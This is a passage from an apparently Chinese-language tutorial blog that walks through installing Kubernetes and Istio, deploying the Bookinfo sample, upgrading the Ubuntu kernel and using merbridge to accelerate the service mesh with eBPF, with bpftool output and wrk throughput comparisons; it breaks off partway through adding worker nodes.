class="line">root@ubuntu:~# kubectl get nodes</span><br><span class="line">NAME     STATUS   ROLES                  AGE   VERSION</span><br><span class="line">ubuntu   Ready    control-plane,master   18m   v1.23.3</span><br></pre></td></tr></table></figure><h6 id="允许master部署pod"><a href="#允许master部署pod" class="headerlink" title="允许master部署pod"></a>允许master部署pod</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl taint nodes --all node-role.kubernetes.io/master-</span><br></pre></td></tr></table></figure><h4 id="服务网格"><a href="#服务网格" class="headerlink" title="服务网格"></a>服务网格</h4><p>服务网格是一个专注于处理服务间通信的基础设施层，它负责在现代云原生应用组成的复杂网络拓扑中可靠的传递请求</p><p>服务网格特点</p><ul><li>轻量级的网络代理</li><li>应用无感知</li><li>应用之间的流量由服务网格接管</li><li>服务间的调用可能出现的超时、重试、监控、追踪等工作下沉到服务网格层处理</li></ul><p>网格一般由数据平面和控制平面组成，数据平面负责在服务中部署一个sidecar的请求代理，控制平面负责请求代理之间的交互，以及用户与请求代理的交互。</p><h5 id="Istio"><a href="#Istio" class="headerlink" title="Istio"></a>Istio</h5><p>通过负载均衡、service-to-service身份验证、监视等方法，Istio可以轻松地创建部署服务网格，而服务代码更改很少或没有更改，我们可以在整个环境中部署一个特殊的sidecar代理来为服务添加Istio支持，该代理可以拦截微服务之间的所有网络通信，然后使用其控制平面功能来配置和管理Istio，其中包括：</p><ul><li>HTTP、gRPC、WebSocket和TCP流量的自动负载平衡</li><li>使用丰富的路由规则、重试、故障转移和故障注入对流量欣慰进行细粒度控制</li><li>支持访问控制、速率限制和配额的可插拔策略层和配置API</li><li>集群内所有流量的自动度量、日志和跟踪，包括集群入口和出口</li><li>在具有强大的基于身份的身份验证和授权的集群中实现安全的服务到服务通信</li></ul><p>Istio的核心功能</p><h6 id="流量管理"><a href="#流量管理" class="headerlink" title="流量管理"></a>流量管理</h6><p>Istio的简单规则配置和流量路由允许控制服务之间的流量和API调用流，Istio简化了服务级属性(如断路器，超时和重试)的配置，并且简化了设置重要任务(如A/B测试，金丝雀测试和按百分比划分的分阶段测试)的工作。有了过呢好的流量可视性和开箱即用故障恢复功能，可以在问题产生之前捕获问题，使调用更可靠，网络更健壮。</p><h6 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h6><p>Istio的安全功能使开发人员可以专注于应用程序级别的安全。Istio提供了底层的安全通信通道，并按比例管理服务通信的身份验证、授权和加密。通过Istio，服务通信在缺省情况下是安全的。允许在不同的协议和运行时之间一致地实施策略。</p><h6 id="观察"><a href="#观察" class="headerlink" title="观察"></a>观察</h6><p>Isio的见状跟踪、监视和日志功能使得我们可以更加深入了解服务网格部署。通过Istio的监视功能，可以真正理解服务性能如何影响上游和下游的事情。而它的自定义仪表板提供了对所有服务的性能的可见性。</p><h5 id="安装Istio"><a href="#安装Istio" class="headerlink" title="安装Istio"></a>安装Istio</h5><p>安装文档地址：<a href="https://istio.io/latest/docs/setup/getting-started/" target="_blank" rel="noopener">https://istio.io/latest/docs/setup/getting-started/</a></p><h6 id="下载1-11-6版本"><a href="#下载1-11-6版本" class="headerlink" title="下载1.11.6版本"></a>下载1.11.6版本</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://istio.io/downloadIstio | ISTIO_VERSION=1.11.6 sh -</span><br></pre></td></tr></table></figure><h6 id="进入到下载目录"><a href="#进入到下载目录" class="headerlink" title="进入到下载目录"></a>进入到下载目录</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd istio-1.11.6/</span><br></pre></td></tr></table></figure><h6 id="添加istioctl客户端到路径"><a href="#添加istioctl客户端到路径" class="headerlink" title="添加istioctl客户端到路径"></a>添加istioctl客户端到路径</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PWD/bin:$PATH</span><br></pre></td></tr></table></figure><h6 id="查看Istio部署模式"><a href="#查看Istio部署模式" class="headerlink" title="查看Istio部署模式"></a>查看Istio部署模式</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# istioctl profile list</span><br><span class="line">Istio configuration profiles:</span><br><span class="line">    default</span><br><span class="line">    demo</span><br><span class="line">    empty</span><br><span class="line">    external</span><br><span class="line">    minimal</span><br><span class="line">    openshift</span><br><span class="line">    preview</span><br><span class="line">    remote</span><br></pre></td></tr></table></figure><h6 id="设置部署模式为demo"><a href="#设置部署模式为demo" class="headerlink" title="设置部署模式为demo"></a>设置部署模式为demo</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">istioctl manifest apply --set profile=demo</span><br></pre></td></tr></table></figure><h6 id="添加命名空间的标签"><a href="#添加命名空间的标签" class="headerlink" title="添加命名空间的标签"></a>添加命名空间的标签</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl label namespace default istio-injection=enabled</span><br><span class="line">namespace/default labeled</span><br></pre></td></tr></table></figure><h5 id="部署案例应用"><a href="#部署案例应用" class="headerlink" title="部署案例应用"></a>部署案例应用</h5><h6 id="部署bookinfo案例"><a href="#部署bookinfo案例" class="headerlink" title="部署bookinfo案例"></a>部署bookinfo案例</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# kubectl apply -f samples/bookinfo/platform/kube/bookinfo.yaml</span><br><span class="line">service/details created</span><br><span class="line">serviceaccount/bookinfo-details created</span><br><span class="line">deployment.apps/details-v1 created</span><br><span class="line">service/ratings created</span><br><span class="line">serviceaccount/bookinfo-ratings created</span><br><span class="line">deployment.apps/ratings-v1 created</span><br><span class="line">service/reviews created</span><br><span class="line">serviceaccount/bookinfo-reviews created</span><br><span class="line">deployment.apps/reviews-v1 created</span><br><span class="line">deployment.apps/reviews-v2 created</span><br><span class="line">deployment.apps/reviews-v3 created</span><br><span class="line">service/productpage created</span><br><span class="line">serviceaccount/bookinfo-productpage created</span><br><span class="line">deployment.apps/productpage-v1 created</span><br></pre></td></tr></table></figure><h6 id="查看pod情况"><a href="#查看pod情况" class="headerlink" title="查看pod情况"></a>查看pod情况</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# kubectl get pods</span><br><span class="line">NAME                              READY   STATUS    RESTARTS   AGE</span><br><span class="line">details-v1-5498c86cf5-bhv2h       2/2     Running   0          13m</span><br><span class="line">productpage-v1-65b75f6885-p6k2w   2/2     Running   0          13m</span><br><span class="line">ratings-v1-b477cf6cf-k84kr        2/2     Running   0          13m</span><br><span class="line">reviews-v1-79d546878f-q6f62       2/2     Running   0          13m</span><br><span class="line">reviews-v2-548c57f459-cqq2r       2/2     Running   0          13m</span><br><span class="line">reviews-v3-6dd79655b9-gr42h       2/2     Running   0          13m</span><br></pre></td></tr></table></figure><h6 id="检查运行是否正常"><a href="#检查运行是否正常" class="headerlink" title="检查运行是否正常"></a>检查运行是否正常</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# kubectl exec "$(kubectl get pod -l app=ratings -o jsonpath='&#123;.items[0].metadata.name&#125;')" -c ratings -- curl -sS productpage:9080/productpage | grep -o "&lt;title&gt;.*&lt;/title&gt;"</span><br><span class="line">&lt;title&gt;Simple Bookstore App&lt;/title&gt;</span><br></pre></td></tr></table></figure><h5 id="开启外部访问"><a href="#开启外部访问" class="headerlink" title="开启外部访问"></a>开启外部访问</h5><h6 id="关联Istio网关"><a href="#关联Istio网关" class="headerlink" title="关联Istio网关"></a>关联Istio网关</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f samples/bookinfo/networking/bookinfo-gateway.yaml</span><br></pre></td></tr></table></figure><h6 id="查看服务外部访问方式"><a href="#查看服务外部访问方式" class="headerlink" title="查看服务外部访问方式"></a>查看服务外部访问方式</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# kubectl get svc istio-ingressgateway -n istio-system</span><br><span class="line">NAME                   TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)                                                                      AGE</span><br><span class="line">istio-ingressgateway   LoadBalancer   10.96.244.67   &lt;none&gt;        15021:32085/TCP,80:31356/TCP,443:31869/TCP,31400:31862/TCP,15443:31190/TCP</span><br></pre></td></tr></table></figure><h6 id="修改访问方式为NodePort"><a href="#修改访问方式为NodePort" class="headerlink" title="修改访问方式为NodePort"></a>修改访问方式为NodePort</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl edit svc istio-ingressgateway -n istio-system</span><br></pre></td></tr></table></figure><h6 id="访问测试"><a href="#访问测试" class="headerlink" title="访问测试"></a>访问测试</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# curl 192.168.19.85:31356/productpage</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;Simple Bookstore App&lt;/title&gt;</span><br><span class="line">&lt;meta charset="utf-8"&gt;</span><br><span class="line">&lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;</span><br><span class="line">&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Latest compiled and minified CSS --&gt;</span><br><span class="line">&lt;link rel="stylesheet" href="static/bootstrap/css/bootstrap.min.css"&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Optional theme --&gt;</span><br><span class="line">&lt;link rel="stylesheet" href="static/bootstrap/css/bootstrap-theme.min.css"&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br></pre></td></tr></table></figure><h4 id="ebpf加速ServiceMesh实验"><a href="#ebpf加速ServiceMesh实验" class="headerlink" title="ebpf加速ServiceMesh实验"></a>ebpf加速ServiceMesh实验</h4><p>代码地址：<a href="https://github.com/merbridge/merbridge" target="_blank" rel="noopener">https://github.com/merbridge/merbridge</a></p><h5 id="升级内核"><a href="#升级内核" class="headerlink" title="升级内核"></a>升级内核</h5><p>实验要求内核版本&gt;=5.7，首先我们还是通过命令查询指定版本的Linux镜像包，发现没有找到可用的版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# apt-cache search linux| grep 5.8</span><br></pre></td></tr></table></figure><p>因此我们直接去官方下载</p><p>地址：<a href="https://kernel.ubuntu.com/~kernel-ppa/mainline/" target="_blank" rel="noopener">https://kernel.ubuntu.com/~kernel-ppa/mainline/</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget -c https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.8/amd64/linux-headers-5.8.0-050800-generic_5.8.0-050800.202008022230_amd64.deb</span><br><span class="line">wget -c https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.8/amd64/linux-headers-5.8.0-050800_5.8.0-050800.202008022230_all.deb</span><br><span class="line">wget -c https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.8/amd64/linux-image-unsigned-5.8.0-050800-generic_5.8.0-050800.202008022230_amd64.deb</span><br><span class="line">wget -c https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.8/amd64/linux-modules-5.8.0-050800-generic_5.8.0-050800.202008022230_amd64.deb</span><br></pre></td></tr></table></figure><p>安装内核Deb软件包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# sudo dpkg -i *.deb</span><br></pre></td></tr></table></figure><p>安装结束后，重新启动系统后查看内核版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# uname -r</span><br><span class="line">5.8.0-050800-generic</span><br></pre></td></tr></table></figure><h5 id="相关版本说明"><a href="#相关版本说明" class="headerlink" title="相关版本说明"></a>相关版本说明</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# docker version</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           20.10.12</span><br><span class="line">root@ubuntu:~# kubectl version</span><br><span class="line">Client Version: version.Info&#123;Major:"1", Minor:"23", GitVersion:"v1.23.3", GitCommit:"816c97ab8cff8a1c72eccca1026f7820e93e0d25", GitTreeState:"clean", BuildDate:"2022-01-25T21:25:17Z", GoVersion:"go1.17.6", Compiler:"gc", Platform:"linux/amd64"&#125;</span><br><span class="line">Server Version: version.Info&#123;Major:"1", Minor:"23", GitVersion:"v1.23.3", GitCommit:"816c97ab8cff8a1c72eccca1026f7820e93e0d25", GitTreeState:"clean", BuildDate:"2022-01-25T21:19:12Z", GoVersion:"go1.17.6", Compiler:"gc", Platform:"linux/amd64"&#125;</span><br><span class="line">root@ubuntu:~# lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 20.04 LTS</span><br><span class="line">Release:        20.04</span><br><span class="line">Codename:       focal</span><br><span class="line">root@ubuntu:~# uname -r</span><br><span class="line">5.8.0-050800-generic</span><br></pre></td></tr></table></figure><h5 id="yaml文件apply之前的ebpf数据"><a href="#yaml文件apply之前的ebpf数据" class="headerlink" title="yaml文件apply之前的ebpf数据"></a>yaml文件apply之前的ebpf数据</h5><p>列出系统中所有cgroup上的附加程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# bpftool cgroup tree</span><br><span class="line">CgroupPath</span><br><span class="line">ID       AttachType      AttachFlags     Name</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-udevd.service</span><br><span class="line">    21       ingress</span><br><span class="line">    20       egress</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-journald.service</span><br><span class="line">    19       ingress</span><br><span class="line">    18       egress</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-logind.service</span><br><span class="line">    23       ingress</span><br><span class="line">    22       egress</span><br></pre></td></tr></table></figure><p>查看系统中已经加载的所有BPF程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# bpftool prog show</span><br><span class="line">18: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">19: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">20: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">21: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">22: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">23: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br></pre></td></tr></table></figure><h5 id="merbridge安装"><a href="#merbridge安装" class="headerlink" title="merbridge安装"></a>merbridge安装</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl apply -f https://raw.githubusercontent.com/merbridge/merbridge/main/deploy/all-in-one.yaml</span><br><span class="line">clusterrole.rbac.authorization.k8s.io/merbridge created</span><br><span class="line">clusterrolebinding.rbac.authorization.k8s.io/merbridge created</span><br><span class="line">serviceaccount/merbridge created</span><br><span class="line">daemonset.apps/merbridge created</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pods -n istio-system</span><br><span class="line">NAME                                    READY   STATUS     RESTARTS   AGE</span><br><span class="line">istio-egressgateway-79bb75fcf9-7plxw    1/1     Running    0          17h</span><br><span class="line">istio-ingressgateway-84bfcfd895-ktbcg   1/1     Running    0          17h</span><br><span class="line">istiod-6c5cfd79db-4ww7r                 1/1     Running    0          17h</span><br><span class="line">merbridge-75rr6                         0/1     Init:0/1   0          2m57s</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pods -n istio-system</span><br><span class="line">NAME                                    READY   STATUS    RESTARTS   AGE</span><br><span class="line">istio-egressgateway-79bb75fcf9-7plxw    1/1     Running   0          19h</span><br><span class="line">istio-ingressgateway-84bfcfd895-ktbcg   1/1     Running   0          19h</span><br><span class="line">istiod-6c5cfd79db-4ww7r                 1/1     Running   0          19h</span><br><span class="line">merbridge-75rr6                        1/1     Running   0          12m</span><br></pre></td></tr></table></figure><p>再次查看系统中所有 cgroup 上的附加程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# bpftool cgroup tree</span><br><span class="line">CgroupPath</span><br><span class="line">ID       AttachType      AttachFlags     Name</span><br><span class="line">/sys/fs/cgroup/unified</span><br><span class="line">31       sock_ops                        mb_sockops</span><br><span class="line">43       bind4                           mb_bind</span><br><span class="line">27       connect4                        mb_sock4_connec</span><br><span class="line">35       getsockopt                      mb_get_sockopt</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-udevd.service</span><br><span class="line">    21       ingress</span><br><span class="line">    20       egress</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-journald.service</span><br><span class="line">    19       ingress</span><br><span class="line">    18       egress</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-logind.service</span><br><span class="line">    23       ingress</span><br><span class="line">    22       egress</span><br></pre></td></tr></table></figure><p>再次查看系统中已经加载的所有 BPF 程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# bpftool prog show</span><br><span class="line">18: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">19: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">20: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">21: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">22: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">23: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">27: cgroup_sock_addr  name mb_sock4_connec  tag 52444be6f9070ca0  gpl</span><br><span class="line">        loaded_at 2022-02-17T09:32:53+0000  uid 0</span><br><span class="line">        xlated 2336B  jited 1329B  memlock 4096B  map_ids 1,2,3,7</span><br><span class="line">        btf_id 3</span><br><span class="line">31: sock_ops  name mb_sockops  tag 92e9974a3364b015  gpl</span><br><span class="line">        loaded_at 2022-02-17T09:32:53+0000  uid 0</span><br><span class="line">        xlated 1272B  jited 704B  memlock 4096B  map_ids 1,3,8,9</span><br><span class="line">        btf_id 6</span><br><span class="line">35: cgroup_sockopt  name mb_get_sockopt  tag d2a89e73318e6dc2  gpl</span><br><span class="line">        loaded_at 2022-02-17T09:32:53+0000  uid 0</span><br><span class="line">        xlated 864B  jited 509B  memlock 4096B  map_ids 8</span><br><span class="line">        btf_id 9</span><br><span class="line">39: sk_msg  name mb_msg_redir  tag 95e99118f09830d0  gpl</span><br><span class="line">        loaded_at 2022-02-17T09:32:53+0000  uid 0</span><br><span class="line">        xlated 376B  jited 237B  memlock 4096B  map_ids 9</span><br><span class="line">        btf_id 12</span><br><span class="line">43: cgroup_sock_addr  name mb_bind  tag 57cd311f2e27366b  gpl</span><br><span class="line">        loaded_at 2022-02-17T09:32:53+0000  uid 0</span><br><span class="line">        xlated 16B  jited 40B  memlock 4096B</span><br><span class="line">        btf_id 15</span><br></pre></td></tr></table></figure><p>发现ebpf程序已经成功加载进内核</p><h5 id="确认ebpf程序生效"><a href="#确认ebpf程序生效" class="headerlink" title="确认ebpf程序生效"></a>确认ebpf程序生效</h5><p>yaml文件开启<code>debug</code>模式</p><p>打开日志追踪</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /sys/kernel/debug/tracing/tracing_on</span><br></pre></td></tr></table></figure><p>再次访问<code>192.168.19.84:31356/productpage</code></p><p>使用<code>cat /sys/kernel/debug/tracing/trace_pipe</code>查看输出</p><p><img src="/2022/02/28/从0到0-5-eBPF加速ServiceMesh实践/1.png" alt="1"></p><h5 id="tps测试如下"><a href="#tps测试如下" class="headerlink" title="tps测试如下"></a>tps测试如下</h5><p>其中85是没有部署merbridge的，即没有通过ebpf加速。84是经过ebpf加速的，可以看到经过ebpf加速之后tps增加了一倍。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/wrk-master# ./wrk -c1000 --latency http://192.168.19.85:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.85:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.19s   402.47ms   1.96s    77.78%</span><br><span class="line">    Req/Sec    14.47     12.03    50.00     78.95%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.21s</span><br><span class="line">     75%    1.34s</span><br><span class="line">     90%    1.77s</span><br><span class="line">     99%    1.96s</span><br><span class="line">  111 requests in 10.04s, 544.62KB read</span><br><span class="line"></span><br><span class="line">root@ubuntu:~/wrk-master# ./wrk -c1000 --latency http://192.168.19.84:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.84:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.52s   367.79ms   1.98s    80.85%</span><br><span class="line">    Req/Sec    17.94     18.18   140.00     89.08%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.61s</span><br><span class="line">     75%    1.72s</span><br><span class="line">     90%    1.85s</span><br><span class="line">     99%    1.98s</span><br><span class="line">  243 requests in 10.02s, 1.17MB read</span><br></pre></td></tr></table></figure><h4 id="集群测试"><a href="#集群测试" class="headerlink" title="集群测试"></a>集群测试</h4><p>集群测试分为两组</p><ul><li>没有经过merbridge加速：<code>192.168.19.85和192.168.19.83</code></li><li>经过merbridge加速：<code>192.168.19.84和192.168.19.82</code></li></ul><p>master节点分别是<code>192.168.19.85和192.168.19.84</code></p><h5 id="slave节点配置"><a href="#slave节点配置" class="headerlink" title="slave节点配置"></a>slave节点配置</h5><p>1.安装docker和k8s工具，这里不再赘述</p><p>2.将从节点加入主节点</p><p>主节点查看令牌，没有则需要创建令牌</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubeadm token list</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubeadm token create</span><br></pre></td></tr></table></figure><p>如果没有 <code>--discovery-token-ca-cert-hash</code> 的值，则可以通过在控制平面节点上执行以下命令来获取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 